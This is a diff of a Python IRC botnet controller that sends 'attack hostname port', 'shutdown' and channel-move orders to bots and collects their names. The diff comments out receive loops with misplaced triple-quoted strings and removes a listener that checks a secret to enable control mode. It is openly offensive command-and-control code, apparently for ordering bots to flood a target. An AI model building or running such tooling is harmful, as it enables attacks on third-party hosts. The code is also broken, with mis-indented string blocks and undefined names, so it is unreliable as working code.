@@ -53,22 +53,23 @@ class PyBotCon:
 
   def conMain(self):
     while(True):
-#      data = ""
-#      data = self.ircsock.recv(1024).decode("UTF-8")
-#      data = data.strip("\n\r")
-#      dataLen = len(data.split()) #Split on white space
-#
-#      if dataLen == 2 and data.split()[0] == "PING":
-#        print("DEBUG --> data recieved: PING REQUEST")
-#        self.ping()
-#      elif dataLen >= 4 and data.split()[1] == "PRIVMSG": 
-#        print("DEBUG --> PRIVMSG/data recieved: ")
-#        senderDetails = data.split()[0].split(":")[1]
-#        senderNick = senderDetails.split("!")[0]
-#        channelOrUser = data.split()[2]   # THIS VARIABLE TELLS IF MESSAGE WAS sent publicly (#Channel), or private message (Our Nick)
-#        temp = data.split("PRIVMSG")[1].split(":")
-#        senderMessage = temp[1]
+'''
+      data = ""
+      data = self.ircsock.recv(1024).decode("UTF-8")
+      data = data.strip("\n\r")
+      dataLen = len(data.split()) #Split on white space
 
+      if dataLen == 2 and data.split()[0] == "PING":
+        print("DEBUG --> data recieved: PING REQUEST")
+        self.ping()
+      elif dataLen >= 4 and data.split()[1] == "PRIVMSG": 
+        print("DEBUG --> PRIVMSG/data recieved: ")
+        senderDetails = data.split()[0].split(":")[1]
+        senderNick = senderDetails.split("!")[0]
+        channelOrUser = data.split()[2]   # THIS VARIABLE TELLS IF MESSAGE WAS sent publicly (#Channel), or private message (Our Nick)
+        temp = data.split("PRIVMSG")[1].split(":")
+        senderMessage = temp[1]
+'''
       print("command> ",end='')
       command = input()
       if(command == "status"):
@@ -91,37 +92,29 @@ class PyBotCon:
 
   def attackOrder(self, hostname, port):
     self.ircsock.send(bytes("PRIVMSG " + self.channel + " :attack " + hostname + " " + port + "\n\r","UTF-8"))
-
+    time.sleep(2)
+    period = timedelta(seconds=5) 
+    endLoop = datetime.now() + period
+'''
+    while datetime.now() < endLoop:
+      read, _, _ = select.select([self.ircsock],[],[],5)
+      if self.ircsock in read:
+        data = self.ircsock.recv(2048).decode("UTF-8")
+        data = data.strip("\n\r")
+        dataLen = len(data.split())
+        if(data.split()[1]=="PRIVMSG" and data.split("PRIVMSG",1)[1].split(":",1)[1].startswith("SUCCESS")): # NOTE --> The response message that we're expecting from bots is "YOURS"
+          temp = data.split("PRIVMSG",1)[1].split(":",1)[1] # Finds name of the bot reply
+          print("DEBUG --> Bot name found:" + temp)
+          self.botList.append(temp[11:]) # Adds the name of the bot reply to botList
+        elif dataLen == 2 and data.split()[0] == "PING":
+          print("DEBUG --> data recieved: PING REQUEST")
+          self.ping()
+'''
   def ping(self):
     self.ircsock.send(bytes("PONG :pingis\n","UTF-8"))
 
   def shutdownCommand(self):
     self.ircsock.send(bytes("PRIVMSG " + self.channel + " :shutdown\n\r","UTF-8"))
-
-  def listen(self):
-    while True:
-      data = ""
-      data = ircsock.recv(4096).decode("UTF-8")
-      data = data.strip("\n\r")
-      print("DEBUG --> data recieved: " + data)
-
-      if data.find("PING :") != -1:  #Respond to server pings (keep alive)
-        s.send(bytes("PONG :pingis\n","UTF-8"))
-
-      elif data.find("PRIVMSG") != -1:
-        temp = data.split("!")
-        user = temp[0][1:] #extract and trim user from temp
-        temp = data.split("PRIVMSG")
-        temp2 = temp[1].split(":")
-        message = temp2[1]
-        print("DEBUG --> " + user + " Says: " + message)
-        self.examinePrivmsg(user,message)
-
-  def examinePrivmsg(self,user,message):
-# This needs to be updated to store the controller's information and accept control commands from the controller only
-    if message == secret:
-      print("DEBUG --> Controller said the secret! Control Mode enabled, read to troll and annoy")
-      self.control = 1
 
   def changeChannel(self,channel,newServer, newPort, newChannel):
     self.ircsock.send(bytes("PRIVMSG " + channel + " :" + "move " + newServer + " " + newPort + " " + newChannel + "\n","UTF-8"))
@@ -141,12 +134,12 @@ class PyBotCon:
         data = self.ircsock.recv(2048).decode("UTF-8")
         data = data.strip("\n\r")
         dataLen = len(data.split())
-        if(data.split()[1]=="PRIVMSG" and data.split("PRIVMSG",1)[1].split(":",1)[1].startswith("BotName$$: ")): # NOTE --> The response message that we're expecting from bots is "YOURS"
+        if(data.split()[1]=="PRIVMSG" and data.split("PRIVMSG",1)[1].split(":",1)[1].startswith("BotName$$: ")):
           temp = data.split("PRIVMSG",1)[1].split(":",1)[1] # Finds name of the bot reply
-          print("DEBUG --> Bot name found:" + temp)
+#          print("DEBUG --> Bot name found:" + temp[11:])
           self.botList.append(temp[11:]) # Adds the name of the bot reply to botList
         elif dataLen == 2 and data.split()[0] == "PING":
-          print("DEBUG --> data recieved: PING REQUEST")
+#          print("DEBUG --> data recieved: PING REQUEST")
           self.ping()
     return
 
